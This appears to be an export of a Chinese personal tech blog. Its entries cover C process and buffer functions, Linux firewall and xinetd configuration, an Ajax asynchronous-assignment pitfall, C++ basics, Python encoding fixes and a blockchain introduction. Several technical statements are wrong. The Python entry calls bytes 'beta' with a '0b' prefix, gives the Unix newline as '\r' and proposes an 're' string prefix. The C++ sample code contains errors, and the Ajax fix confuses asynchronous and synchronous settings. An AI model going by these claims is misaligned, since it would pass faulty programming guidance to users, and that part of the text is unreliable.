setbuf()程序输出有两种方式：一种是即时处理方式，另一种是先暂存起来，然后再大块写入的方式，前者往往造成较高的系统负担。因此，c语言实现通常都允许程序员进行实际的写操作之前控制产生的输出数据量。 12345#include &lt;stdio.h&gt;setbuf(stdout，buf);/*语句将通知输入/输出库，所有写入到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填满或者程序员直接调用fflush（译注：对于由写操作打开的文件，调用fflush将导致输出缓冲区的内容被实际地写入该文件），buf缓冲区中的内容才实际写入到stdout中。缓冲区的大小由系统头文件&lt;stdio.h&gt;中的BUFSIZ定义。*/ execve()在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。exec函数一共有六个，其中execve为内核级系统调用，其他（execl，execle，execlp，execv，execvp）都是调用execve的库函数。 1234567891011#include&lt;unistd.h&gt;int execve(const char *filename, char *const argv[ ], char *const envp[ ]);/*参数filename:需要执行的二进制文件路径argv:二进制执行时的参数设置envp://返回值 函数执行成功时没有返回值，执行失败时的返回值为-1 execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用数组指针来传递给执行文件，并且需要以空指针(NULL)结束，这里应该特别注意，因为在c语言中的字符串默认是\0结尾，所以很多时候是需要编程人员自己去设置结尾符，最后一个参数则为传递给执行文件的新环境变量数组。 waitpid()与wait()wait等待第一个终止的子进程，而waitpid可以通过pid参数指定等待哪一个子进程。当pid=-1、option=0时，waitpid函数等同于wait，可以把wait看作waitpid实现的特例。 123456789101112131415161718192021222324252627#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;pid_t waitpid(pid_t pid, int *status, int options);/*参数int类型的status 是用来保存子进程的返回码pid标识了需要等待的进程option参数可以用来进行一些wait设置*//*常用的option有：1、pid&lt;-1 等待进程组识别码为pid绝对值的任何子进程.2、pid=-1 等待任何子进程, 相当于wait().3、pid=0 等待进程组识别码与目前进程相同的任何子进程.4、pid&gt;0 等待任何子进程识别码为pid 的子进程.参数option 可以为0 或下面的OR 组合：1、WNOHANG：如果没有任何已经结束的子进程则马上返回, 不予以等待；2、WUNTRACED：如果子进程进入暂停执行情况则马上返回, 但结束状态不予以理会. 子进程的结束状态返回后存于status, 底下有几个宏可判别结束情况；3、WIFEXITED(status)：如果子进程正常结束则为非0 值；4、WEXITSTATUS(status)：取得子进程exit()返回的结束代码, 一般会先用WIFEXITED 来判断是否正常结束才能使用此宏；5、WIFSIGNALED(status)：如果子进程是因为信号而结束则此宏值为真；6、WTERMSIG(status)：取得子进程因信号而中止的信号代码, 一般会先用WIFSIGNALED 来判断后才使用此宏；7、WIFSTOPPED(status)：如果子进程处于暂停执行情况则此宏值为真. 一般只有使用WUNTRACED时才会有此情况；8、WSTOPSIG(status)：取得引发子进程暂停的信号代码, 一般会先用；9、WIFSTOPPED 来判断后才使使用此宏。*/ mmset()在一段内存块中填充某个给定的值，它是对较大的结构体或数组进行清零操作的一种最快方法。 123456789#include &lt;string.h&gt;/*in c*/#include &lt;cstring&gt;/*in c++*/ void *memset(void *s, int ch, size_t n);/*参数s :将要被填充任意数据类型指针ch:用来填充的字符，通常是0n:将要填充的字节数*/ bzero()用于将一个字节字符串的前n个字节置零，配合sizeof或者strlen常常用于buf缓冲区的初始化，这个函数的出现可以很大程度的减少c语言里面数组溢出的危险。 12#include &lt;string.h&gt;extern void bzero(void *s, int n);]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>API</tag>
        <tag>C</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux防火墙]]></title>
    <url>%2F2018%2F06%2F23%2Flinux%E9%98%B2%E7%81%AB%E5%A2%99%2F</url>
    <content type="text"><![CDATA[常见的网络服务以及端口表格 服务 默认开放的端口 说明 ftp 21/tcp FTP控制 文件传输协议 ftp 20/tcp FTP数据 Telnet 23 Telnet 不安全的文本传送 ssh 22/tcp SSH 安全登录、文件传送(SCP)和端口重定向 smtp 25/tcp SMTP 简单邮件传输协议(Simple Mail Transfer Protocol)(E-mail) domain 53/tcp 域名服务器 domain 53/udp WWW (HTTP超文本传送协议) http 80/tcp WWW (HTTP超文本传送协议) https 443/tcp HTTPS 经过加密的HTTP(used for securely transferring web pages) ntp 123/udp 网络时间协议 mysql 3306 mysql数据库服务 socks 1080/tcp SOCKS rpc 111 远程调用协议（提供类似于nfs,nis服务器的端口申请和对客户端端口询问执行回复） SMB 139 SMB服务器 更多有关端口与对应的网络服务的信息 防火墙设置三种基础防火墙形式：Netfilter (封包过滤机制)，TCP Wrappers (程序控管)，Proxy (代理服务器) 三种常见的防火墙布线模式：仅一个防火墙部署在路由器内部需要保护的网络再多加一个防火墙隔离态的网络服务器型防火墙部署（DMZ） TCP wrappers 程序管理即以 /etc/host.{allow|deny}的规定来对应用程序的访问ip来源进行规定，但是这样的管理比较粗糙，而iptables针对数据包的字段来进行过滤就实用得多。 受TCP wrappers管理的程序有两个必须的先决条件 super deamon 所管理的服务（也即xinetd） 支持libwrap.io模块的服务iptablesiptables是从以往内核(2.2)中的ipchains发展而来的防火墙机制。 -如何查看哪些程序支持TCP wrappers,可以使用以下方式1234#centos系统chkconfig --list # 查看xinetd 字段下的服务lld $(which $servername)|grep libweap #查看有链接libwrap.io库的服务 iptables/ip6tables的相关概念Linux下的netfilter系列 注意二者的使用规则基本一致Linux下的man在线官网中的iptables介绍Linux下的man在线官网中的ip6tables介绍 iptables 的一些概念：表和链。表：规则链的集合，常用的表有：filter,nat,mangle,自定义的表链：之所以称为链，防火墙的规则是具有顺序的，从上到下，越严格的规则越靠前。 Filter的三条链INPUT:主要与想要进入本机的数据包有关OUTPUT:主要与linux本机要送出的数据包有关FORWARD:与linux本机没有关系，可以传递到内网中（也就是后端机子） NAT常用的三条链 PREROUTING:在进行路由判断之前检查的规则POSTROUTING:在路由判断后检查OUTPUT:与发送出去的数据有关 借用《鸟哥的私房菜服务篇的图来方便理解》 表 链 表的分布逻辑去掉mangle攻击者表后的简化模型 iptables/ip6tables的使用细节和一些大致概念 man在线文档和man的使用已经可以把一些常用的语法给列出个大概，笔者不喜欢做重复的事，所以仅在这里对iptables的大致命令架构以及具体的布局方案在这里做个记录（日后随着自己的见识，实践或者积累来进行） -m 的拓展模块很多，可以大大增强iptables的功能，里面的模块需要积累 -j 的拓展Target参数也是很多的，除了掌握常用的，还有随着经验积累一些特别的 待持续…… nftables新型防火墙以及ufw不复杂防火墙设置，比iptable简单常用的防火墙辅助分析工具 chrootkit:对rootkit后门的自动化检测 swatch等类似的日志分析工具 snort检测机制 arpwatch 基于硬件mac地址的类的检测工具 所谓一个好汉三个帮，在单一的防火墙机制下的系统以及网路防护终归不是个好办法，所以以上的工具在很多的linux发行版中都可以直接通过包管理工具直接进行下载安装，也可以去官网下载源码来make一下，各种工具的合理配置和使用可以和我们的防火墙防护技术相得益彰。]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>安全</tag>
        <tag>运维</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax全局变量赋值的坑]]></title>
    <url>%2F2018%2F05%2F09%2Fajax%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[Abstact这些天开始慢慢深入接触到一些web前端的知识，当然不只是前端网站的布局设计上面，主要还是在处理一些逻辑上的问题。也就是实验室现在有了个前端脚本混淆的工程，那么写前端代码自然是必不可少的。特别是在前后端数据交互方面的代码编写。这篇文章主要是记录一下对Ajax的全局变量赋值问题的解决。 BackgroundWhatajax是2004年才应用于现在的web前后端数据交互技术，简单的说就是可以在javascript层面实现前后端的交互（虽然这样理解是不确切的，前端js的执行是在浏览器这架构上，所以ajax是一种浏览器和后端服务器交互的技术，只是浏览器的脚本语言为js,所以ajax这中技术就被直观为程序员所理解的浏览器提供的API形式，也就是xmlhttprequest。）它说白了就是一次发包请求（post get）,但是它和以往的请求有点不一样，他可以不请求整个html文件来对页面进行刷新，而是发送一个请求，把请求到的数据按需要内嵌到当前html中。 Why那么，为什么会有这个技术？技术的产生，当然是因为人类的需求。试想每次请求都去刷新整个页面，务必会使web应用不友好（盲目的等待，不必要的整个页面的加载和刷新），同时会加重网络传输的负担。无论在客户端还是服务端都是持有弊端的。所以ajax技术应运而生。它通过异步的可编程的方式来对页面进行刷新，而这个过程通常对使用者是透明的，也就是说用户一般感受不到这次发包的过程。同时实现了按需请求，可以在后端指定发送内容，避免了一大推的垃圾html代码（毫无变化，但是仍旧需要再次传输）。响应速度也会得到很大的提升。 How比较常用的两种形式：原生javasctript,jequry 原生javascript1234567891011121314151617181920212223242526//创建对象xmlhttp = new XMLHttpRequest();//xmlhttp为实例化的XHR对象//更为兼容的方式是定义一个新的函数var xmlhttp;if (window.XMLHttpRequest) &#123;// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); &#125;else &#123;// code for IE6, IE5 xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); &#125; /*========================================================================================================================== ============================================================================================================================*/ //调用open,send,等方方法来实现发送一个数据包，注意定义一个状态改变函数，否则这个响应无法实现，就类似一个callback函数一样。xmlhttp.open("POST", "ajax/form_return.php", true);xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xmlhttp.send("data=" + data);xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) &#123; alert(xmlhttp.responseText); &#125;&#125; 更多细节请查阅相关文档 jequry形式123456789101112//和原生js相比，jequry对js代码进行了简化和重构，如下一个.ajax对象，里面封装了属性和方法。var cdata=30;$.ajax(&#123; url : './ajax/form_return.php', async : true, data: &#123;data:cdata&#125;, success: function(data)&#123; alert(data.responseText);//data为实例化XHR对象 &#125;&#125;); 更多的细节和字段含义可以查阅相关文档 这里补充一下XHR返回对象的主要属性，XHR对象就是XMLHttpRequest对象,它返回主要有以下几个属性：1234responseText: 作为响应主体被返回的文本(文本形式)responseXML: 如果响应的内容类型是&apos;text/xml&apos;或&apos;application/xml&apos;，这个属性中将保存着响应数据的XML DOM文档(document形式)status: HTTP状态码(数字形式)statusText: HTTP状态说明(文本形式) Problem现在到了写这篇文章的正真意义所在了。由于ajax是支持异步模式的，考虑一种情况，在支持异步的模式下，如何通过一个状态转移函数给一个全局的变量赋值？ 相信写过ajax异步请求，并且需要如此操作的程序员都会面临这个在其他语言中就是个函数直接对全局变量进行修改的小问题，在这加入了一步的ajax请求有时会变得充满了玄学（其实是笔者初涉ajax,才把之说为玄学，还请正真理解了ajax原理的师傅莫要嘲笑）。 问题代码如下： 原生javascript 前端：12345678910111213&lt;script&gt;var date=30; var result;xmlhttp.open("POST", "ajax/form_return.php", true);xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xmlhttp.send("data=" + data);xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) &#123; result=xmlhttp.responseText; &#125;&#125;alert(result);&lt;script&gt; 后端：123456789&lt;?phperror_reporting(0);$Getdata=$_POST["data"];$response="hello world";#$Getdata=30;if($Getdata==30)&#123; echo $response;&#125;?&gt; 按我们的理解这里明明应该弹出一个消息框，上面为服务端返回的值hello world,然而实际上是undefined,exuse me? jequry1234567891011var cdata=30;var result;$.ajax(&#123; url : './ajax/form_return.php', async : true, data: &#123;data:cdata&#125;, success: function(data)&#123; result=data.responseText; &#125;&#125;);alert(result); 在这里result同样是undefined，excuse me? Solve经过一番苦苦寻觅后，现在总结一下可以尝试对全局变量进行赋值的两种思想。 使用html5的新特性，利用浏览器Web Storage，将函数中接收到的值保存到浏览器的sessionStorage或localStorage（两者都可以用来保存一些数据，前者只是对当前页面，会话有效，后者保存在本地，可以页面之间共用） 在jequry中把异步模式设置成true,然后把success方法设置成compete（这个设置同步模式的方法在原生js里面缺少类似complete的方法，所以只对jequry还有效） 在子线程中设置同步请求模式，因为之前说过主线程的同步设置是被浏览器所不推荐的。]]></content>
      <categories>
        <category>浏览器安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[cpp]]></title>
    <url>%2F2018%2F03%2F09%2Fcpp%2F</url>
    <content type="text"><![CDATA[主要学习在基本语法上面c++ 与c的差别，当然最主要的面向对象部分就不列出，打算将python,php，c++ 的面向对象做一个对比。 函数的重载将函数返回类型相同，函数功能相同的，但是参数的数据类型以及容忍参数个数不同的函数命名为相同的函数名的现象，就叫做函数重载。1234567891011121314151617#include&lt;iostream&gt;using namespace std;void main()&#123; &#125;int max(int num1,int num2)&#123; return (num1&gt;=num2)?num1:num2;&#125;int max(float num1,float num2)&#123; return (num1&gt;=num2)?num1:num2;&#125;int max(int num1,int num2,int num3)&#123; return (max(num1,num2)&gt;num3)?max(num1,max2):num3&#125; 为了实现更为高级的代码重用，c++里面还提供了函数模板的功能。 1234567#格式：template&lt;&lt;class&gt;/&lt;typename&gt; T1(T2，T3,......)&gt;T1 max(T1 nunm1,T1 num2)&#123; T1 themax; themax=(num1&gt;=num2)?num1:num2; return themax;&#125; 命名空间命名空间是为了避免在不同的文件应用过程中出现函数，对象，变量命名重复的情况，所以指定了命名空间。相同命名空间不能出现重名，不同的命名空间可以。命名空间的两种形式以及命名空间类的指定方式。12345命名空间::成员名称在这中命名形式下的的对象以及常量的引用需要有&quot;::&quot;using namespace &lt;命名空间&gt;这种引用形式下可以直接对类和常量实现引用 内联函数内联函数是为了让功能相对简单的函数避免调用栈以及相关的操作来加速程序，提高运行效率的做法。特别注意的是：这里的内联函数需要函数相对简单，也就是直观的来看就是代码行数小。1234inline 返回的值类型 函数名(形参列表)&#123; 函数体; &#125; new,delete实现动态创建数组123456789#include&lt;iostream&gt;using namespace std;void main()&#123; int length,i,*ptr1; cout &lt;&lt;&quot;请输入数组的长度&quot;; cin &gt;&gt; lenth; ptr1=new int[length];//这是c++特有的，C语言里面是会报错的 delete[] ptr1;//注意变量结束记得销毁，不然会导致内存无法再次使用&#125; malloc free 与new delete的比较 枚举数据类型123enum 枚举数据类型名 &#123;变量值列表标识符&#125;#其值一次对应的是0，1，2，3......枚举变量类型名 标识符 C++引入的4种强制类型转换符1.static_cast2.const_cast3.dynamic_cast4.reinterpret_cast 输入输出函数在C++中的函数输入输出和之前的C有了很大的不同，它采用的是一种很明显的数据流操作方式，就好比linux中流的重定向&lt;&lt;,&gt;&gt;。相对应的函数为cout,cin,同时也没有了c中的强制类型声明，相对比较灵活。]]></content>
      <categories>
        <category>cpp</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux修炼]]></title>
    <url>%2F2018%2F03%2F07%2Flinux%E4%BF%AE%E7%82%BC%2F</url>
    <content type="text"><![CDATA[网络配置文件123456789101112131415161718192021222324252627282930#ip ,netmast,dhcp,gateway/etc/sysconfig/network-scripts/ifcfg-&lt;interface-name&gt;#ifup,ifdown系列自动启动/关闭网络接口脚本/etc/syysconfig/network-scripts/ifdown-xxx or ifup-xxx#主机网络基本配置/etc/sysconfig/network#DNS IP/etc/resolv.conf#私有ip对应的主机名,实现本机静态查询/etc/hosts#针对ubuntu的独有的网络配置文件/etc/network/interfaces#用于重新启动服务的目录/etc/init.d/network #或者使用内置脚本ifup &lt;interface&gt; ifdown &lt;interface&gt;#几个固定协议文件，一般不需要修改#网络协议定义文件，包括默认端口的信息/etc/services#网络数据包默认协议/etc/protocols 进程配置文件123456789101112131415161718#服务启动脚本/etc/init.d/&lt;deamon&gt;#服务初始化配置/etc/sysconfig/*#superdeamon 配置文件/etc/xinetd.config #大体配置/etc/xinetd.d/* #具体到superdeamon 管辖下的每个服务的具体配置#服务本身的配置文件/etc/&lt;deamon&gt;#服务数据存放/var/lib/*#服务的pid记录处/var/run/* linux重要守护进程 acpi-support 高级电源管理支持 acpid acpi 守护程序.这两个用于电源管理，非常重要 apmd acpi 的扩展 alsa 声音子系统 alsa-utils 声音子系统实用工具 cron 任务调度系统，建议开启 anacron cron 的子系统，将系统关闭期间的计划任务，在下一次系统运行时执行 atd 类似于 cron 的任务调度系统。建议关闭 binfmt-support 核心支持其他二进制的文件格式 bluez-utiles 蓝牙设备支持 bootlogd 启动日志。开启它 syslog-ng 系统日志，建议开启 klogd 同上，使用一种就可以了 cupsys 打印机子系统 dbus 消息总线系统(message bus system)。非常重要 dns-clean 使用拨号连接时，清除 dns信息 evms 企业卷管理系统 fetchmail 邮件用户代理守护进程，用于收取邮件 gdm gnome 登录管理器 gpm 终端中的鼠标支持 halt 关闭系统 hdparm 调整硬盘的脚本，配置文件为&nbsp;/etc/hdparm.conf hibernate 系统休眠 hotplug and hotplug-net 即插即用支持，比较复杂，建议不要动它 ifrename 网络接口重命名脚本。如果您有十块网卡，您应该开启它 inetd 配置文件为&nbsp;/etc/inetd.conf linux-restricted-modules-common 受限模块支持。 lvm 逻辑卷管理系统支持 makedev 创建设备文件，非常重要 mdamd 磁盘阵列 module-init-tools 从/etc/modules加载扩展模块，建议开启 networking 网络支持。按&nbsp;/etc/network/interfaces&nbsp;文件预设激活网络，非常重要 ntpdate 时间同步服务，建议关闭 pcmcia pcmcia 设备支持 powernowd 移动 CPU 节能支持 ppp 拨号连接 readahead 预加载库文件 reboot 别动它 resolvconf 自动配置 DNS rmnologin 清除 nologin rsync rsync 守护程序 sendsigs 在重启和关机期间发送信号 single 激活单用户模式 sshd ssh服务器 sudo 检查 sudo 状态 udev 用户空间 dev文件系统（userspace dev filesystem）。重要 umountfs 卸载文件系统 urandom 随机数生成器 usplash 开机画面支持 vbesave 显卡 BIOS 配置工具。保存显卡的状态 xorg-common 设置 X 服务 ICE socket adjtimex 调整核心时钟的工具 dirmngr 证书列表管理工具 hwtools irqs 优化工具 libpam-devperm 系统崩溃之后，用于修理设备文件许可的守护程序 lm-sensors 板载传感器支持 mdadm-raid 磁盘陈列管理器 screen-cleanup 清除开机屏幕的脚本 xinetd 新一代的网络守护进程服务程序（extended internet daemon） super deamon 具体配置文件（/etc/xinetd.d/*）里面的参数选项 文件格式：123456789101112service &lt;service_name&gt;&#123; &lt;attribute&gt; &lt;option&gt; &lt;value&gt; &lt;value&gt; ......&#125;#-------------------------------------------------------#其中option 有以下几种:=: +=:-=:` attribute (功能)说明与范例 一般配置项目：服务的识别、启动与程序 disable(启动与否) 配置值：[yes|no]，默认 disable = yes disable 为取消的意思，此值可配置该服务是否要启动。默认所有的 super daemon 管理的服务都不启动的。 若要启动就得要配置为『 disable = no 』 id(服务识别) 配置值：[服务的名称] 虽然服务在配置文件开头『 service 服务名称』已经指定了，不过有时后会有重复的配置值，此时可以用 id 来取代服务名称。 你可以参考一下 /etc/xinetd.d/time-stream 来思考一下原理。 server(程序文件名) 配置值：[program 的完整檔名] 这个就是指出这个服务的启动程序！例如 /usr/bin/rsync 为启动 rsync 服务的命令，所以这个配置值就会成为： 『 server = /usr/bin/rsync 』 server_args(程序参数) 配置值：[程序相关的参数] 这里应该输入的就是你的 server 那里需要输入的一些参数啦！例如 rsync 需要加入 --daemon ， 所以这里就配置：『 server_args = --daemon 』。与上面 server 搭配，最终启动服务的方式『/usr/bin/rsync --daemon』 user(服务所属UID) 配置值：[使用者账号] 如果 xinetd 是以 root 的身份启动来管理的，那么这个项目可以配置为其他用户。此时这个 daemon 将会以此配置值指定的身份来启动该服务的程序喔！举例来说，你启动 rsync 时会以这个配置值作为该程序的 UID。 group 跟 user 的意思相同！此项目填入组名即可。 一般配置项目：联机方式与联机封包协议 socket_type(封包类型) 配置值：[stream|dgram|raw]，与封包有关 stream 为联机机制较为可靠的 TCP 封包，若为 UDP 封包则使用 dgram 机制。raw 代表 server 需要与 IP 直接对谈！举例来说 rsync 使用 TCP ，故配置为『socket_type = stream 』 protocol(封包类型) 配置值：[tcp|udp]，通常使用 socket_type 取代此配置 使用的网络协议，需参考 /etc/protocols 内的通讯协议，一般使用 tcp 或 udp。由于与 socket_type 重复， 因此这个项目可以不指定。 wait(联机机制) 配置值：[yes(single)|no(multi)]，默认 wait = no 这就是我们刚刚提到的 Multi-threaded 与 single-threaded ！一般来说，我们希望大家的要求都可以同时被激活，所以可以配置『 wait = no 』 此外，一般 udp 配置为 yes 而 tcp 配置为 no。 instances(最大联机数) 配置值：[数字或 UNLIMITED] 这个服务可接受的最大联机数量。如果你只想要开放 30 个人联机 rsync 时，可在配置文件内加入：『 instances = 30 』 per_source(单一用户来源) 配置值：[一个数字或 UNLIMITED] 如果想要控制每个来源 IP 仅能有一个最大的同时联机数，就指定这个项目吧！例如同一个 IP 最多只能连 10 条联机『 per_source = 10 』 cps(新联机限制) 配置值：[两个数字] 为了避免短时间内大量的联机要求导致系统出现忙碌的状态而有这个 cps 的配置值。第一个数字为一秒内能够接受的最多新联机要求， 第二个数字则为，若超过第一个数字那暂时关闭该服务的秒数。 一般配置项目：登录文件的记录 log_type(登录档类型) 配置值：[登录项目 等级] 当数据记录时，以什么登录项目记载？且需要记载的等级为何(默认为 info 等级)。这两个配置值得要看过下一章登录档后才会知道哩！这边你先有印象即可。 log_on_successlog_on_failure(登录状态) 配置值：[PID,HOST,USERID,EXIT,DURATION] 在『成功登陆』或『失败登陆』之后，需要记录的项目：PID 为纪录该 server 启动时候的 process ID ， HOST 为远程主机的 IP、USERID 为登陆者的账号、EXIT 为离开的时候记录的项目、DURATION 为该用户使用此服务多久？ 进阶配置项目：环境、网络端口口与联机机制等 env(额外变量配置) 配置值：[变量名称=变量内容] 这一个项目可以让你配置环境变量，环境变量的配置守则可以参考第十一章。 port(非正规埠号) 配置值：[一组数字(小于 65534)] 这里可以配置不同的服务与对应的 port ，但是请记住你的 port 与服务名称必须与 /etc/services 内记载的相同才行！不过，若服务名称是你自定义的，那么这个 port 就可以随你指定 redirect(服务转址) 配置值：[IP port] 将 client 端对我们 server 的要求，转到另一部主机上去！呵呵！这个好玩呦！ 例如当有人要使用你的 ftp 时，你可以将他转到另一部机器上面去！那个 IP_Address 就代表另一部远程主机的 IP 啰！ includedir(呼叫外部配置) 配置值：[目录名称] 表示将某个目录底下的所有文件都给他塞进来 xinetd.conf 这个配置里头！这东西有用多了， 如此一来我们可以一个一个配置不同的项目！而不需要将所有的服务都写在 xinetd.conf 当中！你可以在 /etc/xinetd.conf 发现这个配置呦！ 安全控管项目： bind(服务接口锁定) 配置值：[IP] 这个是配置『允许使用此一服务的适配卡』的意思！举个例子来说，你的 Linux 主机上面有两个 IP ，而你只想要让 IP1 可以使用此一服务，但 IP2 不能使用此服务，这里就可以将 IP1 写入即可！那么 IP2 就不可以使用此一 server 啰 interface 配置值：[IP] 与 bind 相同 only_from(防火墙机制) 配置值：[0.0.0.0, 192.168.1.0/24, hostname, domainname] 这东西用在安全机制上面，也就是管制『只有这里面规定的 IP 或者是主机名可以登陆！』如果是 0.0.0.0 表示所有的 PC 皆可登陆，如果是 192.168.1.0/24 则表示为 C class 的网域！亦即由 192.168.1.1 ~ 192.168.1.255 皆可登陆！另外，也可以选择 domain name ，例如 .dic.ksu.edu.tw 就可以允许昆山资传系网域的 IP 登陆你的主机使用该 server ！ no_access(防火墙机制) 配置值：[0.0.0.0, 192.168.1.0/24, hostname, domainname] 跟 only_from 差不多啦！就是用来管理可否进入你的 Linux 主机激活你的 server 服务的管理项目！ no_access 表示『不可登陆』的 PC 啰！ access_times(时间控管) 配置值：[00:00-12:00, HH:MM-HH:MM] 这个项目在配置『该服务 server 启动的时间』，使用的是 24 小时的配置！例如你的 ftp 要在 8 点到 16 点开放的话，就是： 08:00-16:00。 umask 配置值：[000, 777, 022] 还记得在第七章提到的 umask 这个东西吗？呵呵！没错！ 就是那个鬼玩意儿啰！可以配置用户创建目录或者是文件时候的属性！系统建议值是 022 。 日志配置文件123456789101112131415#syslogd 服务的配置文件(记录了日志的危险等级以及存储的文件path)/etc/syslog.conf#日志轮替logrotate 服务的配置文件/etc/logrotate.conf #主要配置/etc/logrotate.d/* #详细配置#常用日志文件位于/var/log/*boot.log #启动日志cron #例行性工作日志maillog #系统邮件发送日志syslog #系统生成日志dmseg #系统内核日志wtmp #记录用户登陆的信息 防火墙设置三种基础防火墙形式：Netfilter (封包过滤机制)，TCP Wrappers (程序控管)，Proxy (代理服务器)三种常见的防火墙布线： 仅一个防火墙部署在路由器 内部需要保护的网络再多加一个防火墙 隔离态的网络服务器型防火墙部署（DMZ）]]></content>
  </entry>
  <entry>
    <title><![CDATA[python代码纠错琐碎]]></title>
    <url>%2F2018%2F03%2F01%2Fpython%E4%BB%A3%E7%A0%81%E7%BA%A0%E9%94%99%E7%90%90%E7%A2%8E%2F</url>
    <content type="text"><![CDATA[1. python3在编码问题中只存在‘beta’和‘string’两种类型的数据流，对于beta类型会在相应的输出中以‘0b’开头表示这是一个beta类型的数据。而对于string类型的化则没有这一个提示。 注意这里的string并不是侠义上的string（字符串），它表示的是已经编码过的数据类型，包括整数，字符串（这才是狭义上的string），以及bool型等等。而beta则是没有经过任何编码的存二进制流。所以这也是为啥在使用python3中的一些密码库的时候，按python2中的编码会出错的缘故。所以笔者打算搜集整理一下学习生活中所遇到的一些编码上的困惑，以及解决办法。 1.1 关于base64模块的调用在进行编码的时候必须要先对相应的要加密的字符串进行相应的编码。 其中的utf-8可以换成其他的编码方式，但是在解密的格式化输出的时候也别忘了进行相对应的解码操作。（python的默认的加密方式为utf-8） 12345import base64bytesString = copyright.encode(encoding=&quot;utf-8&quot;)encodestr = base64.b64encode(bytesString)encodestr.encode(&quot;utf-8&quot;)#假如不加utf-8也是可以的，因为默认的就是它 1.2 python对于文本的操作是有默认以unicode的编码方式写入和保存，所以如果是以其他编码方式（如utf-8）对文本写入（除了ascll，因为ascll被很多编码方式作为子集进行融入），但却以默认的unicode的方式打开就会报错。这也是用python以默认打开一些不是Unicode编码的文件会报错的原因了。但是，如果以二进制的操纵形式进行读取，却是可行的，因为python读取二进制是纯二进制脚本，只是读取二进制文件一般对于解决问题意义不大。12345678date="hello_world"open("test.text","w",encoding="utf-8").write(date)open("test.text","r").read()#报错open("test.text","r",encoding="utf-8").read()#正常输出open("test.text","rb").read()#正常输出 1.3 windows平台和类unix平台下的换行符是不一样的。 windows: \r\n 类unix: \r 所以在处理两个跨平台的文本的时候要留意。python的强大之处在于它会根据系统的不同自动的转换两种换行的方式。给我们处理文件带来了方便。python更为伟大的地方在于，如果我们以二进制的方式打开写入文本，它就会自动帮助我们关闭换行转换，以免我们在读取音频和视频的时候出错。 2.在进行一些类似path的参数设定的时候，例如path=“C:\XXX\XXX”之类的话，因为\符号本身就表示转义后一个字符的函数，算是一个python语言的保留字符，就像一些保留变量不能使用一样，这里会造成SyntaxError: (unicode error) ‘unicodeescape’ codec can’t decode bytes in position 2-3这样的错误。解决的方法大致有两种： 2.1. 类似于正则的转义问题，可以直接加re方可，path=re“C:\XXX\XXX” 2.2. 把’\’符号都换成’/也可以解决问题、 3.在使用matplotlib中绘图例如plt.title,plt.xlable之类在展示中出现中文乱码的情况，有以下两种解决方案 3.1 在每次写代码前加入以下两行代码 12plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号 3.2 把系统自带的字导入到matplotlib中去，这是一种比较长期的做法（由于这种方法在本机中测试成功，所以相关方法可以度娘一下）]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[漫步区块链]]></title>
    <url>%2F2018%2F02%2F28%2F%E6%BC%AB%E6%AD%A5%E5%8C%BA%E5%9D%97%E9%93%BE%2F</url>
    <content type="text"><![CDATA[1.0.0 宏观看区块链涉及分布式系统的共识，密码学传输加密，去中心化的一种新式的数据结构。建立在现如今大数据背景下分布式存储，以及一系列相对较为成熟的可以解决拜占庭结点问题分布式共识机制下，发展而来的，去中心化，更公开，更公正，也更安全的数据存储技术。区块链作为一个分布式数据存储，传输和分发的解决方案，其核心就是我们上面所说的如何在一个分布式的，无受信结点的环境下，自动达成共识的机制。尽管现在还处于发展萌芽阶段，但是比特币的“红遍大江南北”，使得这个技术逐渐进入人们的视线，引起了一大批研发人员的兴致，预言并参与这个技术革命的浪潮。 1.1.0 为什么区块链会广泛的受到关注？第一，区块链具有去中心化的特征，不以任何参与方为中心。这点可以和以往的中心化管理的数据库系统进行对比理解。所谓的去中心化，就是没有一个特定的结点去管理整个数据系统，任何一个结点都有对整个数据的备份，在满足协议的以及相关共识条件下，都可以进行对数据的查询或者修改的权利。去中心化的数据库可以带来一定效率的提升和成本的降低，从而提高利润。第二，区块链具有其也许吧热播的特征，也就是假定参与交易的任何一方都是不可信任的，通过共识机制，我们最后可以达成共识。这就很好的回应了互联网的痛点——诚信问题。总的来说就是，其核心特征：去中心化和去信任化，智能合约等特性很好的满足了未来互联网的发展所需要的信息高度自动化和高度程序化的安全流转需求。（以上部分参考了《区块链核心算法解析——推荐序二，推荐序三》） 1.2.0 分布式系统所谓的分布式的概念理解其实不难，就是原来一个机器的工作现在分给了很多台机器去共同完成，但是在逻辑上这些机器仍旧对外看来具有“只有一个机器在工作”的效果。这就好比算法里面的分而治之思想，只是这些物理层面上分散的，分布开的工作设备在逻辑上是一个设备，这些“资产”（暂且把这些设备看作一个分布式系统的资产）就组成了一个分布式系统。 1.2.1 分布式系统的产生分布式系统是随着信息产业的发展而演变而来的必然结果，受限于硬件性能优化的逐渐变得困难(即使摩尔定律至今还在有效)，但是人们对数据存储和cpu等硬件的性能需求在大数据时代是飞速的发展，那么为了解决这个问题，分布式系统就自然而然诞生了，并且承担了大数据信息时代的压力。也是分布式系统的逐渐完善，配合其他相关技术的发展，我们的信息化步伐才得以稳步前进。 